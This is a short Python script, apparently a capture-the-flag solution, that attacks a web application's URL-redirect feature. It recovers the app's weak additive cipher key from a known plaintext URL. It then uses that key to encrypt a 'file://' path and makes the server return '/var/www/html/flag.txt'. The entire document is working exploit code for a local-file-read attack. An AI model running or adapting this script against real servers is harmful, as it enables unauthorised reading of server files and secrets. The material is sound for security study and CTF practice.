import requests
import base64

def encrypt(plaintext, key):
    key_length = len(key)
    key_as_int = [ord(i) for i in key]
    plaintext_int = [ord(i) for i in plaintext]
    ciphertext = []
    for i in range(len(plaintext_int)):
        value = (plaintext_int[i] + key_as_int[i % key_length]) % 256
        ciphertext.append(value)
    return bytes(ciphertext)

def calculate_key(ciphertext, plaintext):
    key = []
    for i in range(0, len(ciphertext)):
        if ciphertext[i] - ord(plaintext[i]) < 0:
            key.append(chr(ciphertext[i] - ord(plaintext[i]) + 256))
        else:
            key.append(chr(ciphertext[i] - ord(plaintext[i])))

    return "".join(key[:32])

def exploit(url, file_to_read):
    r = requests.post(url + '/index.php', data={'url': 'http://aaaaaaaaaaaaaaaaaaaaaaaaaaa.com'}, allow_redirects=False)

    b64_url_ciphertext = r.headers['location'].split('?q=')[1]
    b64_url_ciphertext = b64_url_ciphertext + "=" * (len(b64_url_ciphertext) % 4)
    url_ciphertext = base64.b64decode(b64_url_ciphertext)
    url_plaintext = 'http://aaaaaaaaaaaaaaaaaaaaaaaaaaa.com'

    key = calculate_key(url_ciphertext, url_plaintext)
    return requests.get(url + '/index.php', params={'q': base64.b64encode(encrypt(file_to_read, key))}).text

print(exploit('http://localhost:8100/app', 'file:///var/www/html/flag.txt'))